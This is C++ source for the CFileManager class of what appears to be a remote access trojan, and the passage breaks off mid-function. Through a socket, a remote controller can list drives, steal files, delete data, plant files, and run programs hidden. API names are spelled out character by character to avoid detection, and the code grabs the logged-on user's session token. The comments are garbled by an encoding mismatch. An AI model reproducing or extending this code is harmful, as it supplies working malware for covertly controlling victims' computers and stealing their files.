// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "FileFinder.h"
#include "FileManager.h"
#include <LM.h>
#include <ShlObj.h>
#include <shellapi.h>
#include <Shlwapi.h>
#include "../zlib/zlib.h"  // �����ServerĿ¼  // �����ServerĿ¼
#include <vector>  

// ZIP�ļ���ʽ�ṹ����  
#pragma pack(1)  
struct ZipLocalFileHeader {  
    DWORD signature;        // 0x04034b50  
    WORD version;           // �汾��Ҫ  
    WORD flags;             // ͨ�ñ�־  
    WORD compression;       // ѹ������  
    WORD modTime;           // �޸�ʱ��  
    WORD modDate;           // �޸�����  
    DWORD crc32;            // CRC32У��  
    DWORD compressedSize;   // ѹ�����С  
    DWORD uncompressedSize; // ԭʼ��С  
    WORD filenameLength;    // �ļ�������  
    WORD extraLength;       // ��չ�ֶγ���  
};  

struct ZipCentralDirEntry {  
    DWORD signature;        // 0x02014b50  
    WORD versionMade;       // �����汾  
    WORD versionNeeded;     // ��Ҫ�汾  
    WORD flags;             // ͨ�ñ�־  
    WORD compression;       // ѹ������  
    WORD modTime;           // �޸�ʱ��  
    WORD modDate;           // �޸�����  
    DWORD crc32;            // CRC32У��  
    DWORD compressedSize;   // ѹ�����С  
    DWORD uncompressedSize; // ԭʼ��С  
    WORD filenameLength;    // �ļ�������  
    WORD extraLength;       // ��չ�ֶγ���  
    WORD commentLength;     // ע�ͳ���  
    WORD diskNumber;        // ���̺�  
    WORD internalAttr;      // �ڲ�����  
    DWORD externalAttr;     // �ⲿ����  
    DWORD localHeaderOffset; // ����ͷƫ��  
};  

struct ZipEndOfCentralDir {  
    DWORD signature;        // 0x06054b50  
    WORD diskNumber;        // ���̺�  
    WORD centralDirDisk;    // ����Ŀ¼���̺�  
    WORD entriesOnDisk;     // ��������Ŀ��  
    WORD totalEntries;      // ����Ŀ��  
    DWORD centralDirSize;   // ����Ŀ¼��С  
    DWORD centralDirOffset; // ����Ŀ¼ƫ��  
    WORD commentLength;     // ע�ͳ���  
};  
#pragma pack()

typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

enum
{
	COMMAND_COMPRESS_FILE_PARAM,
};

extern FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName);
extern bool OpenFile1(LPCTSTR lpFile, BOOL bRunInAcsiUser, INT nShowCmd);

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
{
	m_bIsWow64 = FALSE;
	IsWow64Process(GetCurrentProcess(), &m_bIsWow64);
	m_hFileSend = INVALID_HANDLE_VALUE;
	m_hFileRecv = INVALID_HANDLE_VALUE;
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	// �����������б�, ��ʼ�����ļ������������߳�
	SendDriveList();
}

CFileManager::~CFileManager()
{
	m_UploadList.clear();
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}
}

void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	PVOID OldValue = NULL;
	BOOL bRevert = FALSE;
	if (m_bIsWow64)
	{
		char AjrFx[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
		char xTfkA[]={'W','o','w','6','4','D','i','s','a','b','l','e','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n','\0'};
		typedef BOOL (WINAPI *Wow64DisableWow64FsRedirectionT)(PVOID *OldValue);
		Wow64DisableWow64FsRedirectionT pWow64DisableWow64FsRedirection=(Wow64DisableWow64FsRedirectionT)MyGetProcAddressA(AjrFx,xTfkA);
		if (pWow64DisableWow64FsRedirection)
			bRevert = pWow64DisableWow64FsRedirection(&OldValue);
	}
	
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:			// ��ȡ�����б�(�ļ��б�)
		SendFilesList((char *)lpBuffer + 1);
		break;
	case COMMAND_DELETE_FILE:			// ���ض�ɾ�������ļ�
		DeleteFile((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:		// ���ض�ɾ�������ļ���
		DeleteDirectory((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DOWN_FILES:			// �ϴ��ļ�, ���ڿ��ƶ���˵�������ļ�, ���ƶ˽������ļ�(���ļ�)
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE:				// �ϴ�����, ���ڿ��ƶ���˵����������, ���ƶ˽��������ݵ�֮ǰ�����Ŀ��ļ�
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:			// ���ض˴���һ���յ��ļ���
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:			// ���ض��������ļ���(�ļ�)
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:					// �˴�����
		StopTransfer(*&lpBuffer[1]);
		break;
	case COMMAND_SET_TRANSFER_MODE:		// �����ļ�(���ڿ��ƶ���˵���ϴ��ļ�)ʱ�Ĵ���ģʽ, �������Ǽ̴�������
		SetTransferMode(lpBuffer + 1);
		break;
	case COMMAND_FILE_SIZE:				// �����ļ�, ���ڿ��ƶ���˵���ϴ��ļ�, ���ض˽������ļ�(���ļ�)
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:				// ��������, ���ڿ��ƶ���˵���ϴ�����, ���ض˽��������ݵ�֮ǰ�����Ŀ��ļ�
		WriteLocalRecvFile(lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_OPEN_FILE_SHOW:		// ���ض��Կɼ���ʽ��ָ�����ļ�(Ŀ¼)
		OpenFile1((char *)lpBuffer + 2, !*(lpBuffer + 1), SW_SHOW);
		//ShellExecute(NULL, "open", (char *)lpBuffer + 1, NULL, NULL, SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:		// ���ض������ط�ʽ��ָ�����ļ�(Ŀ¼)
		OpenFile1((char *)lpBuffer + 2, !*(lpBuffer + 1), SW_HIDE);
		//ShellExecute(NULL, "open", (char *)lpBuffer + 1, NULL, NULL, SW_HIDE);
		break;
	case COMMAND_COMPRESS_FILE_PARAM:	// ���ض���(WinRAR)ѹ�����ѹָ�����ļ�(Ŀ¼)
		ExeCompress(lpBuffer + 1);
		break;
	case COMMAND_SEARCH_FILE:
		SearchFile(lpBuffer + 1);
		break;
	default:
		break;
	}
	
	if (bRevert)
	{
		char VjrFx[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
		char xTfkV[]={'W','o','w','6','4','R','e','v','e','r','t','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n','\0'};
		typedef BOOL (WINAPI *Wow64RevertWow64FsRedirectionT)(PVOID OldValue);
		Wow64RevertWow64FsRedirectionT pWow64RevertWow64FsRedirection=(Wow64RevertWow64FsRedirectionT)MyGetProcAddressA(VjrFx,xTfkV);
		if (pWow64RevertWow64FsRedirection)
			pWow64RevertWow64FsRedirection(OldValue);
	}
}

bool CFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.
    __try
    {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectory(pszDirCopy, NULL))
                    {
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}

bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	char str175914[]={'\"','%','1','\0'};
	char str175947[]={'%','1','\0'};
	lpstrCat = strstr(strTemp, str175914);
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp,str175947);
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	char str142919[]={'W','i','n','S','t','a','0','\\','D','e','f','a','u','l','t','\0'};
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = str142919; 
	
	return CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}

HANDLE CFileManager::ImpersonateLoggedOnUserWrapper()
{
	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char wSuTs[]={'W','T','S','G','e','t','A','c','t','i','v','e','C','o','n','s','o','l','e','S','e','s','s','i','o','n','I','d','\0'};
	typedef DWORD (WINAPI *WTSGetActiveConsoleSessionIdT)(void);
	WTSGetActiveConsoleSessionIdT pWTSGetActiveConsoleSessionId=(WTSGetActiveConsoleSessionIdT)MyGetProcAddressA(iOagR,wSuTs);
	
	char oIksN[]={'W','T','S','A','P','I','3','2','.','d','l','l','\0'};
	char xAsDm[]={'W','T','S','Q','u','e','r','y','U','s','e','r','T','o','k','e','n','\0'};
	typedef BOOL (WINAPI *WTSQueryUserTokenT)(ULONG SessionId,PHANDLE phToken);
	WTSQueryUserTokenT pWTSQueryUserToken=(WTSQueryUserTokenT)MyGetProcAddressA(oIksN,xAsDm);
	
	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	char kbCfr[]={'I','m','p','e','r','s','o','n','a','t','e','L','o','g','g','e','d','O','n','U','s','e','r','\0'};
	typedef BOOL (WINAPI *ImpersonateLoggedOnUserT)(HANDLE hToken);
	ImpersonateLoggedOnUserT pImpersonateLoggedOnUser=(ImpersonateLoggedOnUserT)MyGetProcAddressA(AjrFx,kbCfr);
	
	HANDLE hToken = NULL;
	if (pWTSGetActiveConsoleSessionId && pWTSQueryUserToken && pImpersonateLoggedOnUser)
	{
		DWORD dwConsoleSessionId = pWTSGetActiveConsoleSessionId();
		if (pWTSQueryUserToken(dwConsoleSessionId, &hToken))
		{
//			if (pImpersonateLoggedOnUser(hToken))
				return hToken;
		}
	}
	return NULL;
}

UINT CFileManager::SendDriveList()
{
	char	DriveString[256];
	// ǰһ���ֽ�Ϊ���ƣ������52�ֽ�Ϊ���������������
	BYTE	DriveList[2048];
	char	FileSystem[MAX_PATH];
	char	*pDrive = NULL;
	char	szUserName[UNLEN+1];
	DWORD	dwUserLen = UNLEN;
	DriveList[0] = TOKEN_DRIVE_LIST; // �������б�
	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	pDrive = DriveString;
	
	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // �ܴ�С
	unsigned long		FreeMB = 0; // ʣ��ռ�
	
	GetUserName(szUserName, &dwUserLen);
	if (stricmp(szUserName, "SYSTEM") == 0)
		DriveList[1] = TRUE;
	else
		DriveList[1] = FALSE;
	
	HANDLE hTokenAcsi = ImpersonateLoggedOnUserWrapper();
//	SHGetSpecialFolderPath(NULL, (char *)&DriveList[1], CSIDL_DESKTOPDIRECTORY, FALSE);
	SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, hTokenAcsi, SHGFP_TYPE_CURRENT, (char *)&DriveList[2]);
//	RevertToSelf();
	CloseHandle(hTokenAcsi);
	
	for (DWORD dwOffset = 1 + 1 + lstrlen((char *)&DriveList[2]) + 1; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)
	{
		memset(FileSystem, 0, sizeof(FileSystem));
		// �õ��ļ�ϵͳ��Ϣ����С
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		SHFILEINFO	sfi;
		SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		
		int	nTypeNameLen = lstrlen(sfi.szTypeName) + 1;
		int	nFileSystemLen = lstrlen(FileSystem) + 1;
		
		// ������̴�С
		if (pDrive[0] != 'A' && pDrive[0] != 'B' && GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// ��ʼ��ֵ
		DriveList[dwOffset] = pDrive[0];
		DriveList[dwOffset + 1] = GetDriveType(pDrive);
		
		// ���̿ռ�����ռȥ��8�ֽ�
		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));
		
		// ���̾��������������
		memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
		memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);
		
		dwOffset += 10 + nTypeNameLen + nFileSystemLen;
	}

	return Send((LPBYTE)DriveList, dwOffset);
}

UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	// ���ô��䷽ʽ
	m_nTransferMode = TRANSFER_MODE_NORMAL;	

	UINT	nRet = 0;
	char	strPath[MAX_PATH];
	char	*lpszSlash = NULL;
	char	*pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // λ��ָ��
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; // �ȷ���10K�Ļ�����
	WIN32_FIND_DATA	FindFileData;
	
	if (lpszDirectory[lstrlen(lpszDirectory) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
	char str18010[]={'%','s','%','s','*','.','*','\0'};
	wsprintf(strPath,str18010, lpszDirectory, lpszSlash);
	hFile = FindFirstFile(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}
	
	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
	*lpList = TOKEN_FILE_LIST;
	
	// 1 Ϊ���ݰ�ͷ����ռ�ֽ�,���ֵ
	dwOffset = 1;
	/*
	�ļ�����	1
	�ļ���		strlen(filename) + 1 ('\0')
	�ļ���С	4
	*/
	do 
	{
		// ��̬��չ������
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
			continue;
		// �ļ����� 1 �ֽ�
		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// �ļ��� lstrlen(pszFileName) + 1 �ֽ�
		nLen = lstrlen(pszFileName);
		memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		dwOffset++;
		
		// �ļ���С 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// ������ʱ�� 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while(FindNextFile(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	LocalFree(lpList);
	FindClose(hFile);
	return nRet;
}

bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));
	
	if (lpszDirectory[lstrlen(lpszDirectory) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
    char str18114[]={'%','s','%','s','*','.','*','\0'};
	wsprintf(lpszFilter,str18114, lpszDirectory, lpszSlash);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
		return false;
	char str18046[]={'%','s','%','s','%','s','\0'};
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory,str18046, lpszDirectory, lpszSlash, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile,str18046, lpszDirectory, lpszSlash, wfd.cFileName);
				if (wfd.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
					SetFileAttributes(strFile, FILE_ATTRIBUTE_NORMAL);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // �رղ��Ҿ��
	
	if(!RemoveDirectory(lpszDirectory))
	{
		return false;
	}
	return true;
}

UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// ���浱ǰ���ڲ������ļ���
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, lpszFileName);
	
	if (m_hFileSend != INVALID_HANDLE_VALUE)
		CloseHandle(m_hFileSend);
	m_hFileSend = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (m_hFileSend == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize(m_hFileSend, &dwSizeHigh);
	//CloseHandle(m_hFileSend); // �˴���Ҫ�ر�, �Ժ�Ҫ��
	// �������ݰ��������ļ�����(1�ֽ�token, 8�ֽڴ�С, �ļ�����, '\0')
	int		nPacketSize = lstrlen(lpszFileName) + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	memcpy(bPacket + 9, lpszFileName, lstrlen(lpszFileName) + 1);

	nRet = Send(bPacket, nPacketSize);
	LocalFree(bPacket);
	return nRet;
}

UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	UINT		nRet;
	FILESIZE	*pFileSize;
	char		*lpFileName;

	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;

	// Զ��������������һ��
	if (pFileSize->dwSizeHigh == -1 && pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}

	SetFilePointer(m_hFileSend, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4���ݰ�ͷ����С
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  ��С��ƫ�ƣ��ļ���������
	lpPacket[0] = TOKEN_FILE_DATA;
	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
	ReadFile(m_hFileSend, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	//CloseHandle(m_hFileSend); // �˴���Ҫ�ر�, �Ժ�Ҫ��

	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}

	LocalFree(lpPacket);

	return nRet;
}

// ������һ���ļ�
void CFileManager::UploadNext()
{
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	list <string>::iterator it = m_UploadList.begin();
	// ɾ��һ������
	m_UploadList.erase(it);
	// �����ϴ�����
	if(m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// �ϴ���һ��
		it = m_UploadList.begin();
		SendFileSize((*it).c_str());
	}
}

int CFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{
	if (lpBuffer[lstrlen((char *)lpBuffer) - 1] == '\\')
	{
		FixedUploadList((char *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer(TRUE);
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((char *)lpBuffer);
	}

	list <string>::iterator it = m_UploadList.begin();
	// ���͵�һ���ļ�
	SendFileSize((*it).c_str());

	return true;
}

bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
    char str18114[]={'%','s','%','s','*','.','*','\0'};
	wsprintf(lpszFilter,str18114, lpPathName, lpszSlash);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
		return false;
	char str18046[]={'%','s','%','s','%','s','\0'};
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory,str18046, lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile,str18046, lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // �رղ��Ҿ��
	return true;
}

void CFileManager::StopTransfer(BOOL bIsUpload)
{
	if (!m_UploadList.empty())
		m_UploadList.clear();
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}
	if (bIsUpload)
		SendToken(TOKEN_TRANSFER_FINISH);
}

void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	// ���浱ǰ���ڲ������ļ���
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, (char *)lpBuffer + 8);
	
	// �����ļ�����
	m_nCurrentProcessFileLength = ((__int64)pFileSize->dwSizeHigh << 32) + pFileSize->dwSizeLow;
	
	// �������Ŀ¼
	MakeSureDirectoryPathExists(m_strCurrentProcessFileName);
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE);
	}
	else
	{
		GetFileData();
	}
	FindClose(hFind);
}

void CFileManager::GetFileData()
{
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	//  1�ֽ�Token,���ֽ�ƫ�Ƹ���λ�����ֽ�ƫ�Ƶ���λ
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // �ļ��򿪷�ʽ 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	
	// �ļ��Ѿ�����
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// ��ʾ��ʲô
		// ���������
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
		// ����
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// ƫ����0
			memset(bToken + 1, 0, 8);
			// ���´���
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// ������һ��
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 1, &dwOffset, 4);
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// ƫ����0
		memset(bToken + 1, 0, 8);
		// ���´���
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);
	
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
		CloseHandle(m_hFileRecv);
	m_hFileRecv = CreateFile(m_strCurrentProcessFileName,
		GENERIC_WRITE, 0, NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, 0);
	// ��Ҫ������
	if (m_hFileRecv == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	//CloseHandle(m_hFileRecv); // �˴���Ҫ�ر�, �Ժ�Ҫ��

	Send(bToken, sizeof(bToken));
}

void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// �������
	BYTE		*pData;
	DWORD		dwBytesToWrite;
	DWORD		dwBytesWrite;
	int			nHeadLength = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9
	FILESIZE	*pFileSize;
	
	// �õ����ݵ�ƫ��
	pData = lpBuffer + 8;
	pFileSize = (FILESIZE *)lpBuffer;
	
	// �õ��������ļ��е�ƫ��
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;
	
	dwBytesToWrite = nSize - 8;
	
	SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
